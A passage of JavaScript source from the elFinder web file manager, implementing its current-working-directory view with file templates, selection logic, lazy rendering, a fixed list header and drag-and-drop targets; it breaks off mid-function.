/**
 * elFinder current working directory ui.
 *
 * @author Dmitry (dio) Levashov
 **/
 jQuery.fn.elfindercwd = function(fm, options) {
	"use strict";
	this.not('.elfinder-cwd').each(function() {
		// fm.time('cwdLoad');
		
		var mobile = fm.UA.Mobile,
			list = fm.viewType == 'list',

			undef = 'undefined',
			/**
			 * Select event full name
			 *
			 * @type String
			 **/
			evtSelect = 'select.'+fm.namespace,
			
			/**
			 * Unselect event full name
			 *
			 * @type String
			 **/
			evtUnselect = 'unselect.'+fm.namespace,
			
			/**
			 * Disable event full name
			 *
			 * @type String
			 **/
			evtDisable = 'disable.'+fm.namespace,
			
			/**
			 * Disable event full name
			 *
			 * @type String
			 **/
			evtEnable = 'enable.'+fm.namespace,
			
			c = 'class',
			/**
			 * File css class
			 *
			 * @type String
			 **/
			clFile       = fm.res(c, 'cwdfile'),
			
			/**
			 * Selected css class
			 *
			 * @type String
			 **/
			fileSelector = '.'+clFile,
			
			/**
			 * Selected css class
			 *
			 * @type String
			 **/
			clSelected = 'ui-selected',
			
			/**
			 * Disabled css class
			 *
			 * @type String
			 **/
			clDisabled = fm.res(c, 'disabled'),
			
			/**
			 * Draggable css class
			 *
			 * @type String
			 **/
			clDraggable = fm.res(c, 'draggable'),
			
			/**
			 * Droppable css class
			 *
			 * @type String
			 **/
			clDroppable = fm.res(c, 'droppable'),
			
			/**
			 * Hover css class
			 *
			 * @type String
			 **/
			clHover     = fm.res(c, 'hover'),

			/**
			 * Active css class
			 *
			 * @type String
			 **/
			clActive     = fm.res(c, 'active'),

			/**
			 * Hover css class
			 *
			 * @type String
			 **/
			clDropActive = fm.res(c, 'adroppable'),

			/**
			 * Css class for temporary nodes (for mkdir/mkfile) commands
			 *
			 * @type String
			 **/
			clTmp = clFile+'-tmp',

			/**
			 * Select checkbox css class
			 * 
			 * @type String
			 */
			clSelChk = 'elfinder-cwd-selectchk',

			/**
			 * Number of thumbnails to load in one request (new api only)
			 *
			 * @type Number
			 **/
			tmbNum = fm.options.loadTmbs > 0 ? fm.options.loadTmbs : 5,
			
			/**
			 * Current search query.
			 *
			 * @type String
			 */
			query = '',

			/**
			 * Currect clipboard(cut) hashes as object key
			 * 
			 * @type Object
			 */
			clipCuts = {},

			/**
			 * Parents hashes of cwd
			 *
			 * @type Array
			 */
			cwdParents = [],
			
			/**
			 * cwd current hashes
			 * 
			 * @type Array
			 */
			cwdHashes = [],

			/**
			 * incsearch current hashes
			 * 
			 * @type Array
			 */
			incHashes = void 0,

			/**
			 * Custom columns name and order
			 *
			 * @type Array
			 */
			customCols = [],

			/**
			 * Current clicked element id of first time for dblclick
			 * 
			 * @type String
			 */
			curClickId = '',

			/**
			 * Custom columns builder
			 *
			 * @type Function
			 */
			customColsBuild = function() {
				var cols = '';
				for (var i = 0; i < customCols.length; i++) {
					cols += '<td class="elfinder-col-'+customCols[i]+'">{' + customCols[i] + '}</td>';
				}
				return cols;
			},

			/**
			 * Make template.row from customCols
			 *
			 * @type Function
			 */
			makeTemplateRow = function() {
				return '<tr id="{id}" class="'+clFile+' {permsclass} {dirclass}" title="{tooltip}"{css}><td class="elfinder-col-name"><div class="elfinder-cwd-file-wrapper"><span class="elfinder-cwd-icon {mime}"{style}></span>{marker}<span class="elfinder-cwd-filename">{name}</span></div>'+selectCheckbox+'</td>'+customColsBuild()+'</tr>';
			},
			
			selectCheckbox = (jQuery.map(options.showSelectCheckboxUA, function(t) {return (fm.UA[t] || t.match(/^all$/i))? true : null;}).length)? '<div class="elfinder-cwd-select"><input type="checkbox" class="'+clSelChk+'"></div>' : '',

			colResizing = false,
			
			colWidth = null,

			/**
			 * Table header height
			 */
			thHeight,

			/**
			 * File templates
			 *
			 * @type Object
			 **/
			templates = {
				icon : '<div id="{id}" class="'+clFile+' {permsclass} {dirclass} ui-corner-all" title="{tooltip}"><div class="elfinder-cwd-file-wrapper ui-corner-all"><div class="elfinder-cwd-icon {mime} ui-corner-all" unselectable="on"{style}></div>{marker}</div><div class="elfinder-cwd-filename" title="{nametitle}">{name}</div>'+selectCheckbox+'</div>',
				row  : ''
			},
			
			permsTpl = fm.res('tpl', 'perms'),
			
			lockTpl = fm.res('tpl', 'lock'),
			
			symlinkTpl = fm.res('tpl', 'symlink'),
			
			/**
			 * Template placeholders replacement rules
			 *
			 * @type Object
			 **/
			replacement = {
				id : function(f) {
					return fm.cwdHash2Id(f.hash);
				},
				name : function(f) {
					var name = fm.escape(f.i18 || f.name);
					!list && (name = name.replace(/([_.])/g, '&#8203;$1'));
					return name;
				},
				nametitle : function(f) {
					return fm.escape(f.i18 || f.name);
				},
				permsclass : function(f) {
					return fm.perms2class(f);
				},
				perm : function(f) {
					return fm.formatPermissions(f);
				},
				dirclass : function(f) {
					var cName = f.mime == 'directory' ? 'directory' : '';
					f.isroot && (cName += ' isroot');
					f.csscls && (cName += ' ' + fm.escape(f.csscls));
					options.getClass && (cName += ' ' + options.getClass(f));
					return cName;
				},
				style : function(f) {
					return f.icon? fm.getIconStyle(f) : '';
				},
				mime : function(f) {
					var cName = fm.mime2class(f.mime);
					f.icon && (cName += ' elfinder-cwd-bgurl');
					return cName;
				},
				size : function(f) {
					return (f.mime === 'directory' && !f.size)? '-' : fm.formatSize(f.size);
				},
				date : function(f) {
					return fm.formatDate(f);
				},
				kind : function(f) {
					return fm.mime2kind(f);
				},
				mode : function(f) {
					return f.perm? fm.formatFileMode(f.perm) : '';
				},
				modestr : function(f) {
					return f.perm? fm.formatFileMode(f.perm, 'string') : '';
				},
				modeoct : function(f) {
					return f.perm? fm.formatFileMode(f.perm, 'octal') : '';
				},
				modeboth : function(f) {
					return f.perm? fm.formatFileMode(f.perm, 'both') : '';
				},
				marker : function(f) {
					return (f.alias || f.mime == 'symlink-broken' ? symlinkTpl : '')+(!f.read || !f.write ? permsTpl : '')+(f.locked ? lockTpl : '');
				},
				tooltip : function(f) {
					var title = fm.formatDate(f) + (f.size > 0 ? ' ('+fm.formatSize(f.size)+')' : ''),
						info  = '';
					if (query && f.path) {
						info = fm.escape(f.path.replace(/\/[^\/]*$/, ''));
					} else {
						info = f.tooltip? fm.escape(f.tooltip).replace(/\r/g, '&#13;') : '';
					}
					if (list) {
						info += (info? '&#13;' : '') + fm.escape(f.i18 || f.name);
					}
					return info? info + '&#13;' + title : title;
				}
			},
			
			/**
			 * Type badge CSS added flag
			 * 
			 * @type Object
			 */
			addedBadges = {},
			
			/**
			 * Type badge style sheet element
			 * 
			 * @type Object
			 */
			addBadgeStyleSheet,
			
			/**
			 * Add type badge CSS into 'head'
			 * 
			 * @type Fundtion
			 */
			addBadgeStyle = function(mime, name) {
				var sel, ext, type;
				if (mime && ! addedBadges[mime]) {
					if (typeof addBadgeStyleSheet === 'undefined') {
						if (jQuery('#elfinderAddBadgeStyle'+fm.namespace).length) {
							jQuery('#elfinderAddBadgeStyle'+fm.namespace).remove();
						}
						addBadgeStyleSheet = jQuery('<style id="addBadgeStyle'+fm.namespace+'"></style>').insertBefore(jQuery('head').children(':first')).get(0).sheet || null;
					}
					if (addBadgeStyleSheet) {
						mime = mime.toLowerCase();
						type = mime.split('/');
						ext = fm.escape(fm.mimeTypes[mime] || (name.replace(/.bac?k$/i, '').match(/\.([^.]+)$/) || ['',''])[1]);
						if (ext) {
							sel = '.elfinder-cwd-icon-' + type[0].replace(/(\.|\+)/g, '-');
							if (typeof type[1] !== 'undefined') {
								sel += '.elfinder-cwd-icon-' + type[1].replace(/(\.|\+)/g, '-');
							}
							try {
								addBadgeStyleSheet.insertRule(sel + ':before{content:"' + ext.toLowerCase() + '"}', 0);
							} catch(e) {}
						}
						addedBadges[mime] = true;
					}
				}
			},
			
			/**
			 * Return file html
			 *
			 * @param  Object  file info
			 * @return String
			 **/
			itemhtml = function(f) {
				f.mime && f.mime !== 'directory' && !addedBadges[f.mime] && addBadgeStyle(f.mime, f.name);
				return templates[list ? 'row' : 'icon']
						.replace(/\{([a-z0-9_]+)\}/g, function(s, e) { 
							return replacement[e] ? replacement[e](f, fm) : (f[e] ? f[e] : ''); 
						});
			},
			
			/**
			 * jQueery node that will be selected next
			 * 
			 * @type Object jQuery node
			 */
			selectedNext = jQuery(),
			
			/**
			 * Flag. Required for msie to avoid unselect files on dragstart
			 *
			 * @type Boolean
			 **/
			selectLock = false,
			
			/**
			 * Move selection to prev/next file
			 *
			 * @param String  move direction
			 * @param Boolean append to current selection
			 * @return void
			 * @rise select			
			 */
			select = function(keyCode, append) {
				var code     = jQuery.ui.keyCode,
					prev     = keyCode == code.LEFT || keyCode == code.UP,
					sel      = cwd.find('[id].'+clSelected),
					selector = prev ? 'first:' : 'last',
					s, n, sib, top, left;

				function sibling(n, direction) {
					return n[direction+'All']('[id]:not(.'+clDisabled+'):not(.elfinder-cwd-parent):first');
				}
				
				if (sel.length) {
					s = sel.filter(prev ? ':first' : ':last');
					sib = sibling(s, prev ? 'prev' : 'next');
					
					if (!sib.length) {
						// there is no sibling on required side - do not move selection
						n = s;
					} else if (list || keyCode == code.LEFT || keyCode == code.RIGHT) {
						// find real prevoius file
						n = sib;
					} else {
						// find up/down side file in icons view
						top = s.position().top;
						left = s.position().left;

						n = s;
						if (prev) {
							do {
								n = n.prev('[id]');
							} while (n.length && !(n.position().top < top && n.position().left <= left));

							if (n.hasClass(clDisabled)) {
								n = sibling(n, 'next');
							}
						} else {
							do {
								n = n.next('[id]');
							} while (n.length && !(n.position().top > top && n.position().left >= left));
							
							if (n.hasClass(clDisabled)) {
								n = sibling(n, 'prev');
							}
							// there is row before last one - select last file
							if (!n.length) {
								sib = cwd.find('[id]:not(.'+clDisabled+'):last');
								if (sib.position().top > top) {
									n = sib;
								}
							}
						}
					}
					// !append && unselectAll();
				} else {
					if (selectedNext.length) {
						n = prev? selectedNext.prev() : selectedNext;
					} else {
						// there are no selected file - select first/last one
						n = cwd.find('[id]:not(.'+clDisabled+'):not(.elfinder-cwd-parent):'+(prev ? 'last' : 'first'));
					}
				}
				
				if (n && n.length && !n.hasClass('elfinder-cwd-parent')) {
					if (s && append) {
						// append new files to selected
						n = s.add(s[prev ? 'prevUntil' : 'nextUntil']('#'+n.attr('id'))).add(n);
					} else {
						// unselect selected files
						sel.trigger(evtUnselect);
					}
					// select file(s)
					n.trigger(evtSelect);
					// set its visible
					scrollToView(n.filter(prev ? ':first' : ':last'));
					// update cache/view
					trigger();
				}
			},
			
			selectedFiles = {},
			
			selectFile = function(hash) {
				fm.cwdHash2Elm(hash).trigger(evtSelect);
			},
			
			allSelected = false,
			
			selectAll = function() {
				var phash = fm.cwd().hash;

				selectCheckbox && selectAllCheckbox.find('input').prop('checked', true);
				fm.lazy(function() {
					var files;
					if (fm.maxTargets && (incHashes || cwdHashes).length > fm.maxTargets) {
						unselectAll({ notrigger: true });
						files = jQuery.map(incHashes || cwdHashes, function(hash) { return fm.file(hash) || null; });
						files = files.slice(0, fm.maxTargets);
						selectedFiles = {};
						jQuery.each(files, function(i, v) {
							selectedFiles[v.hash] = true;
							fm.cwdHash2Elm(v.hash).trigger(evtSelect);
						});
						fm.toast({mode: 'warning', msg: fm.i18n(['errMaxTargets', fm.maxTargets])});
					} else {
						cwd.find('[id]:not(.'+clSelected+'):not(.elfinder-cwd-parent)').trigger(evtSelect);
						selectedFiles = fm.arrayFlip(incHashes || cwdHashes, true);
					}
					trigger();
					selectCheckbox && selectAllCheckbox.data('pending', false);
				}, 0, {repaint: true});
			},
			
			/**
			 * Unselect all files
			 *
			 * @param  Object  options
			 * @return void
			 */
			unselectAll = function(opts) {
				var o = opts || {};
				selectCheckbox && selectAllCheckbox.find('input').prop('checked', false);
				if (Object.keys(selectedFiles).length) {
					selectLock = false;
					selectedFiles = {};
					cwd.find('[id].'+clSelected).trigger(evtUnselect);
					selectCheckbox && cwd.find('input:checkbox.'+clSelChk).prop('checked', false);
				}
				!o.notrigger && trigger();
				selectCheckbox && selectAllCheckbox.data('pending', false);
				cwd.removeClass('elfinder-cwd-allselected');
			},
			
			selectInvert = function() {
				var invHashes = {};
				if (allSelected) {
					unselectAll();
				} else if (! Object.keys(selectedFiles).length) {
					selectAll();
				} else {
					jQuery.each((incHashes || cwdHashes), function(i, h) {
						var itemNode = fm.cwdHash2Elm(h);
						if (! selectedFiles[h]) {
							invHashes[h] = true;
							itemNode.length && itemNode.trigger(evtSelect);
						} else {
							itemNode.length && itemNode.trigger(evtUnselect);
						}
					});
					selectedFiles = invHashes;
					trigger();
				}
			},
			
			/**
			 * Return selected files hashes list
			 *
			 * @return Array
			 */
			selected = function() {
				return Object.keys(selectedFiles);
			},
			
			/**
			 * Last selected node id
			 * 
			 * @type String|Void
			 */
			lastSelect = void 0,
			
			/**
			 * Fire elfinder "select" event and pass selected files to it
			 *
			 * @return void
			 */
			trigger = function() {
				var selected = Object.keys(selectedFiles),
					opts = {
						selected : selected,
						origin : 'cwd'
					};
				
				if (oldSchoolItem && (selected.length > 1 || selected[0] !== fm.cwdId2Hash(
					oldSchoolItem.attr('id'))) && oldSchoolItem.hasClass(clSelected)) {
					oldSchoolItem.trigger(evtUnselect);
				}
				allSelected = selected.length && (selected.length === (incHashes || cwdHashes).length) && (!fm.maxTargets || selected.length <= fm.maxTargets);
				if (selectCheckbox) {
					selectAllCheckbox.find('input').prop('checked', allSelected);
					cwd[allSelected? 'addClass' : 'removeClass']('elfinder-cwd-allselected');
				}
				if (allSelected) {
					opts.selectall = true;
				} else if (! selected.length) {
					opts.unselectall = true;
				}
				fm.trigger('select', opts);
			},
			
			/**
			 * Scroll file to set it visible
			 *
			 * @param DOMElement  file/dir node
			 * @return void
			 */
			scrollToView = function(o, blink) {
				if (! o.length) {
					return;
				}
				var ftop    = o.position().top,
					fheight = o.outerHeight(true),
					wtop    = wrapper.scrollTop(),
					wheight = wrapper.get(0).clientHeight,
					thheight = tableHeader? tableHeader.outerHeight(true) : 0;

				if (ftop + thheight + fheight > wtop + wheight) {
					wrapper.scrollTop(parseInt(ftop + thheight + fheight - wheight));
				} else if (ftop < wtop) {
					wrapper.scrollTop(ftop);
				}
				list && wrapper.scrollLeft(0);
				!!blink && fm.resources.blink(o, 'lookme');
			},
			
			/**
			 * Files we get from server but not show yet
			 *
			 * @type Array
			 **/
			buffer = [],
			
			/**
			 * Extra data of buffer
			 *
			 * @type Object
			 **/
			bufferExt = {},
			
			/**
			 * Return index of elements with required hash in buffer 
			 *
			 * @param String  file hash
			 * @return Number
			 */
			index = function(hash) {
				var l = buffer.length;
				
				while (l--) {
					if (buffer[l].hash == hash) {
						return l;
					}
				}
				return -1;
			},
			
			/**
			 * Scroll start event name
			 *
			 * @type String
			 **/
			scrollStartEvent = 'elfscrstart',
			
			/**
			 * Scroll stop event name
			 *
			 * @type String
			 **/
			scrollEvent = 'elfscrstop',
			
			scrolling = false,
			
			/**
			 * jQuery UI selectable option
			 * 
			 * @type Object
			 */
			selectableOption = {
				disabled   : true,
				filter     : '[id]:first',
				stop       : trigger,
				delay      : 250,
				appendTo   : 'body',
				autoRefresh: false,
				selected   : function(e, ui) { jQuery(ui.selected).trigger(evtSelect); },
				unselected : function(e, ui) { jQuery(ui.unselected).trigger(evtUnselect); }
			},
			
			/**
			 * hashes of items displayed in current view
			 * 
			 * @type Object  ItemHash => DomId
			 */
			inViewHashes = {},
			
			/**
			 * Processing when the current view is changed (On open, search, scroll, resize etc.)
			 * 
			 * @return void
			 */
			wrapperRepaint = function(init, recnt) {
				if (!bufferExt.renderd) {
					return;
				}
				var firstNode = (list? cwd.find('tbody:first') : cwd).children('[id]'+(options.oldSchool? ':not(.elfinder-cwd-parent)' : '')+':first');
				if (!firstNode.length) {
					return;
				}
				var selectable = cwd.data('selectable'),
					rec = (function() {
						var wos = wrapper.offset(),
							ww = wrapper.width(),
							w = jQuery(window),
							x = firstNode.width() / 2,
							l = Math.min(wos.left - w.scrollLeft() + (fm.direction === 'ltr'? x : ww - x), wos.left + ww - 10),
							t = wos.top - w.scrollTop() + 10 + (list? thHeight : 0);
						return {left: Math.max(0, Math.round(l)), top: Math.max(0, Math.round(t))};
					})(),
					tgt = init? firstNode : jQuery(document.elementFromPoint(rec.left , rec.top)),
					ids = {},
					tmbs = {},
					multi = 5,
					cnt = Math.ceil((bufferExt.hpi? Math.ceil((wz.data('rectangle').height / bufferExt.hpi) * 1.5) : showFiles) / multi),
					chk = function() {
						var id, hash, file, i;
						for (i = 0; i < multi; i++) {
							id = tgt.attr('id');
							if (id) {
								bufferExt.getTmbs = [];
								hash = fm.cwdId2Hash(id);
								inViewHashes[hash] = id;
								// for tmbs
								if (bufferExt.attachTmbs[hash]) {
									tmbs[hash] = bufferExt.attachTmbs[hash];
								}
								// for selectable
								selectable && (ids[id] = true);
							}
							// next node
							tgt = tgt.next();
							if (!tgt.length) {
								break;
							}
						}
					},
					done = function() {
						var idsArr;
						if (cwd.data('selectable')) {
							Object.assign(ids, selectedFiles);
							idsArr = Object.keys(ids);
							if (idsArr.length) {
								selectableOption.filter = '#'+idsArr.join(', #');
								cwd.selectable('enable').selectable('option', {filter : selectableOption.filter}).selectable('refresh');
							}
						}
						if (Object.keys(tmbs).length) {
							bufferExt.getTmbs = [];
							attachThumbnails(tmbs);
						}
					},
					setTarget = function() {
						if (!tgt.hasClass(clFile)) {
							tgt = tgt.closest(fileSelector);
						}
					},
					arr, widget;
				
				inViewHashes = {};
				selectable && cwd.selectable('option', 'disabled');
				
				if (tgt.length) {
					if (!tgt.hasClass(clFile) && !tgt.closest(fileSelector).length) {
						// dialog, serach button etc.
						widget = fm.getUI().find('.ui-dialog:visible,.ui-widget:visible');
						if (widget.length) {
							widget.hide();
							tgt = jQuery(document.elementFromPoint(rec.left , rec.top));
							widget.show();
						} else {
							widget = null;
						}
					}
					setTarget();
					if (!tgt.length) {
						// try search 5px down
						widget && widget.hide();
						tgt = jQuery(document.elementFromPoint(rec.left , rec.top + 5));
						widget && widget.show();
						setTarget();
					}
				}

				if (tgt.length) {
					if (tgt.attr('id')) {
						if (init) {
							for (var i = 0; i < cnt; i++) {
								chk();
								if (! tgt.length) {
									break;
								}
							}
							done();
						} else {
							bufferExt.repaintJob && bufferExt.repaintJob.state() === 'pending' && bufferExt.repaintJob.reject();
							arr = new Array(cnt);
							bufferExt.repaintJob = fm.asyncJob(function() {
								chk();
								if (! tgt.length) {
									done();
									bufferExt.repaintJob && bufferExt.repaintJob.state() === 'pending' && bufferExt.repaintJob.reject();
								}
							}, arr).done(done);
						}
					}
				} else if (init && bufferExt.renderd) {
					// In initial request, cwd DOM not renderd so doing lazy check
					recnt = recnt || 0;
					if (recnt < 10) { // Prevent infinite loop
						requestAnimationFrame(function() {
							wrapperRepaint(init, ++recnt);
						});
					}
				}
			},
			
			/**
			 * Item node of oldScholl ".."
			 */
			oldSchoolItem = null,

			/**
			 * display parent folder with ".." name
			 * 
			 * @param  String  phash
			 * @return void
			 */
			oldSchool = function(p) {
				var phash = fm.cwd().phash,
					pdir  = fm.file(phash) || null,
					set   = function(pdir) {
						if (pdir) {
							oldSchoolItem = jQuery(itemhtml(jQuery.extend(true, {}, pdir, {name : '..', i18 : '..', mime : 'directory'})))
								.addClass('elfinder-cwd-parent')
								.on('dblclick', function() {
									fm.trigger('select', {selected : [phash]}).exec('open', phash);
								});
							(list ? oldSchoolItem.children('td:first') : oldSchoolItem).children('.elfinder-cwd-select').remove();
							if (fm.cwdHash2Elm(phash).length) {
								fm.cwdHash2Elm(phash).replaceWith(oldSchoolItem);
							} else {
								(list ? cwd.find('tbody') : cwd).prepend(oldSchoolItem);
							}
							fm.draggingUiHelper && fm.draggingUiHelper.data('refreshPositions', 1);
						}
					};
				if (pdir) {
					set(pdir);
				} else {
					set({hash: phash, read: true, write: true});
					if (fm.getUI('tree').length) {
						fm.one('parents', function() {
							set(fm.file(phash) || null);
							wrapper.trigger(scrollEvent);
						});
					} else {
						fm.request({
							data : {cmd : 'parents', target : fm.cwd().hash},
							preventFail : true
						})
						.done(function(data) {
							set(fm.file(phash) || null);
							wrapper.trigger(scrollEvent);
						});
					}
				}
			},
			
			showFiles = fm.options.showFiles,
			
			/**
			 * Cwd scroll event handler.
			 * Lazy load - append to cwd not shown files
			 *
			 * @return void
			 */
			render = function() {
				if (bufferExt.rendering || (bufferExt.renderd && ! buffer.length)) {
					return;
				}
				var place = (list ? cwd.children('table').children('tbody') : cwd),
					phash,
					chk,
					// created document fragment for jQuery >= 1.12, 2.2, 3.0
					// see Studio-42/elFinder#1544 @ github
					docFlag = jQuery.htmlPrefilter? true : false,
					tempDom = docFlag? jQuery(document.createDocumentFragment()) : jQuery('<div></div>'),
					go      = function(o){
						var over  = o || null,
							html  = [],
							dirs  = false,
							atmb  = {},
							stmb  = (fm.option('tmbUrl') === 'self'),
							init  = bufferExt.renderd? false : true,
							files, locks, selected;
						
						files = buffer.splice(0, showFiles + (over || 0) / (bufferExt.hpi || 1));
						bufferExt.renderd += files.length;
						if (! buffer.length) {
							bottomMarker.hide();
							wrapper.off(scrollEvent, render);
						}
						
						locks = [];
						html = jQuery.map(files, function(f) {
							if (f.hash && f.name) {
								if (f.mime == 'directory') {
									dirs = true;
								}
								if ((f.tmb && (f.tmb != 1 || f.size > 0)) || (stmb && f.mime.indexOf('image/') === 0)) {
									atmb[f.hash] = f.tmb || 'self';
								}
								clipCuts[f.hash] && locks.push(f.hash);
								return itemhtml(f);
							}
							return null;
						});

						// html into temp node
						tempDom.empty().append(html.join(''));
						
						// make directory droppable
						dirs && !mobile && makeDroppable(tempDom);
						
						// check selected items
						selected = [];
						if (Object.keys(selectedFiles).length) {
							tempDom.find('[id]:not(.'+clSelected+'):not(.elfinder-cwd-parent)').each(function() {
								selectedFiles[fm.cwdId2Hash(this.id)] && selected.push(jQuery(this));
							});
						}
						
						// append to cwd
						place.append(docFlag? tempDom : tempDom.children());
						
						// trigger select
						if (selected.length) {
							jQuery.each(selected, function(i, n) { n.trigger(evtSelect); });
							trigger();
						}
						
						locks.length && fm.trigger('lockfiles', {files: locks});
						!bufferExt.hpi && bottomMarkerShow(place, files.length);
						
						if (list) {
							// show thead
							cwd.find('thead').show();
							// fixed table header
							fixTableHeader({fitWidth: ! colWidth});
						}
						
						if (Object.keys(atmb).length) {
							Object.assign(bufferExt.attachTmbs, atmb);
						}
						
						if (init) {
							if (! mobile && ! cwd.data('selectable')) {
								// make files selectable
								cwd.selectable(selectableOption).data('selectable', true);
							}
						}

						! scrolling && wrapper.trigger(scrollEvent);
					};
				
				if (! bufferExt.renderd) {
					// first time to go()
					bufferExt.rendering = true;
					// scroll top on dir load to avoid scroll after page reload
					wrapper.scrollTop(0);
					phash = fm.cwd().phash;
					go();
					if (options.oldSchool) {
						if (phash && !query) {
							oldSchool(phash);
						} else {
							oldSchoolItem = jQuery();
						}
					}
					if (list) {
						colWidth && setColwidth();
						fixTableHeader({fitWidth: true});
					}
					bufferExt.itemH = (list? place.find('tr:first') : place.find('[id]:first')).outerHeight(true);
					fm.trigger('cwdrender');
					bufferExt.rendering = false;
					wrapperRepaint(true);
				}
				if (! bufferExt.rendering && buffer.length) {
					// next go()
					if ((chk = (wrapper.height() + wrapper.scrollTop() + fm.options.showThreshold + bufferExt.row) - (bufferExt.renderd * bufferExt.hpi)) > 0) {
						bufferExt.rendering = true;
						fm.lazy(function() {
							go(chk);
							bufferExt.rendering = false;
						});
					} else {
						!fm.enabled() && resize();
					}
				} else {
					resize();
				}
			},
			
			// fixed table header jQuery object
			tableHeader = null,

			// Is UA support CSS sticky
			cssSticky = fm.UA.CSS.positionSticky && fm.UA.CSS.widthMaxContent,
			
			// To fixed table header colmun
			fixTableHeader = function(optsArg) {
				thHeight = 0;
				if (! options.listView.fixedHeader) {
					return;
				}
				var setPos = function() {
					var val, pos;
					pos = (fm.direction === 'ltr')? 'left' : 'right';
					val = ((fm.direction === 'ltr')? wrapper.scrollLeft() : table.outerWidth(true) - wrapper.width() - wrapper.scrollLeft()) * -1;
					if (base.css(pos) !== val) {
						base.css(pos, val);
					}
				},
				opts = optsArg || {},
				cnt, base, table, htable, thead, tbody, hheight, htr, btr, htd, btd, htw, btw, init;
				
				tbody = cwd.find('tbody');
				btr = tbody.children('tr:first');
				if (btr.length && btr.is(':visible')) {
					table = tbody.parent();
					if (! tableHeader) {
						init = true;
						tbody.addClass('elfinder-cwd-fixheader');
						thead = cwd.find('thead').attr('id', fm.namespace+'-cwd-thead');
						htr = thead.children('tr:first');
						hheight = htr.outerHeight(true);
						cwd.css('margin-top', hheight - parseInt(table.css('padding-top')));
						if (cssSticky) {
							tableHeader = jQuery('<div class="elfinder-table-header-sticky"></div>').addClass(cwd.attr('class')).append(jQuery('<table></table>').append(thead));
							cwd.after(tableHeader);
							wrapper.on('resize.fixheader', function(e) {
								e.stopPropagation();
								fixTableHeader({fitWidth: true});
							});
						} else {
							base = jQuery('<div></div>').addClass(cwd.attr('class')).append(jQuery('<table></table>').append(thead));
							tableHeader = jQuery('<div></div>').addClass(wrapper.attr('class') + ' elfinder-cwd-fixheader')
								.removeClass('ui-droppable native-droppable')
								.css(wrapper.position())
								.css({ height: hheight, width: cwd.outerWidth() })
								.append(base);
							if (fm.direction === 'rtl') {
								tableHeader.css('left', (wrapper.data('width') - wrapper.width()) + 'px');
							}
							setPos();
							wrapper.after(tableHeader)
								.on('scroll.fixheader resize.fixheader', function(e) {
									setPos();
									if (e.type === 'resize') {
										e.stopPropagation();
										tableHeader.css(wrapper.position());
										wrapper.data('width', wrapper.css('overflow', 'hidden').width());
										wrapper.css('overflow', 'auto');
										fixTableHeader();
									}
								});
						}
					} else {
						thead = jQuery('#'+fm.namespace+'-cwd-thead');
						htr = thead.children('tr:first');
					}
					
					if (init || opts.fitWidth || Math.abs(btr.outerWidth() - htr.outerWidth()) > 2) {
						cnt = customCols.length + 1;
						for (var i = 0; i < cnt; i++) {
							htd = htr.children('td:eq('+i+')');
							btd = btr.children('td:eq('+i+')');
							htw = htd.width();
							btw = btd.width();
							if (typeof htd.data('delta') === 'undefined') {
								htd.data('delta', (htd.outerWidth() - htw) - (btd.outerWidth() - btw));
							}
							btw -= htd.data('delta');
							if (! init && ! opts.fitWidth && htw === btw) {
								break;
							}
							htd.css('width', btw + 'px');
						}
					}
					
					if (!cssSticky) {
						tableHeader.data('widthTimer') && cancelAnimationFrame(tableHeader.data('widthTimer'));
						tableHeader.data('widthTimer', requestAnimationFrame(function() {
							if (tableHeader) {
								tableHeader.css('width', mBoard.width() + 'px');
								if (fm.direction === 'rtl') {
									tableHeader.css('left', (wrapper.data('width') - wrapper.width()) + 'px');
								}
							}
						}));
					}
					thHeight = thead.height();
				}
			},
			
			// Set colmun width
			setColwidth = function() {
				if (list && colWidth) {
					var cl = 'elfinder-cwd-colwidth',
					first = cwd.find('tr[id]:first'),
					former;
					if (! first.hasClass(cl)) {
						former = cwd.find('tr.'+cl);
						former.removeClass(cl).find('td').css('width', '');
						first.addClass(cl);
						cwd.find('table:first').css('table-layout', 'fixed');
						jQuery.each(jQuery.merge(['name'], customCols), function(i, k) {
							var w = colWidth[k] || first.find('td.elfinder-col-'+k).width();
							first.find('td.elfinder-col-'+k).width(w);
						});
					}
				}
			},
			
			/**
			 * Droppable options for cwd.
			 * Drop target is `wrapper`
			 * Do not add class on childs file over
			 *
			 * @type Object
			 */
			droppable = Object.assign({}, fm.droppable, {
				over : function(e, ui) {
					var dst    = jQuery(this),
						helper = ui.helper,
						ctr    = fm._commands.copy && (e.shiftKey || e.ctrlKey || e.metaKey),
						hash, status, inParent;
					e.stopPropagation();
					helper.data('dropover', helper.data('dropover') + 1);
					dst.data('dropover', true);
					helper.removeClass('elfinder-drag-helper-move elfinder-drag-helper-plus');
					if (helper.data('namespace') !== fm.namespace || ! fm.insideWorkzone(e.pageX, e.pageY)) {
						dst.removeClass(clDropActive);
						//helper.removeClass('elfinder-drag-helper-move elfinder-drag-helper-plus');
						return;
					}
					if (dst.hasClass(fm.res(c, 'cwdfile'))) {
						hash = fm.cwdId2Hash(dst.attr('id'));
						dst.data('dropover', hash);
					} else {
						hash = fm.cwd().hash;
						fm.cwd().write && dst.data('dropover', hash);
					}
					inParent = (fm.file(helper.data('files')[0]).phash === hash);
					if (dst.data('dropover') === hash) {
						jQuery.each(helper.data('files'), function(i, h) {
							if (h === hash || (inParent && !ctr && !helper.hasClass('elfinder-drag-helper-plus'))) {
								dst.removeClass(clDropActive);
								return false; // break jQuery.each
							}
						});
					} else {
						dst.removeClass(clDropActive);
					}
					if (helper.data('locked') || inParent) {
						status = 'elfinder-drag-helper-plus';
					} else {
						status = 'elfinder-drag-helper-move';
						if (ctr) {
							status += ' elfinder-drag-helper-plus';
						}
					}
					dst.hasClass(clDropActive) && helper.addClass(status);
					requestAnimationFrame(function(){ dst.hasClass(clDropActive) && helper.addClass(status); });
				},
				out : function(e, ui) {
					var helper = ui.helper;
					e.stopPropagation();
					helper.removeClass('elfinder-drag-helper-move elfinder-drag-helper-plus').data('dropover', Math.max(helper.data('dropover') - 1, 0));
					jQuery(this).removeData('dropover')
					       .removeClass(clDropActive);
				},
				deactivate : function() {
					jQuery(this).removeData('dropover')
					       .removeClass(clDropActive);
				},
				drop : function(e, ui) {
					unselectAll({ notrigger: true });
					fm.droppable.drop.call(this, e, ui);
				}
			}),
			
			/**
			 * Make directory droppable
			 *
			 * @return void
			 */
			makeDroppable = function(place) {
				place = place? place : (list ? cwd.find('tbody') : cwd);
				var targets = place.children('.directory:not(.'+clDroppable+',.elfinder-na,.elfinder-ro)');

				if (fm.isCommandEnabled('paste')) {
					targets.droppable(droppable);
				}
				if (fm.isCommandEnabled('upload')) {
					targets.addClass('native-droppable');
				}
				
				place.children('.isroot').each(function(i, n) {
					var $n   = jQuery(n),
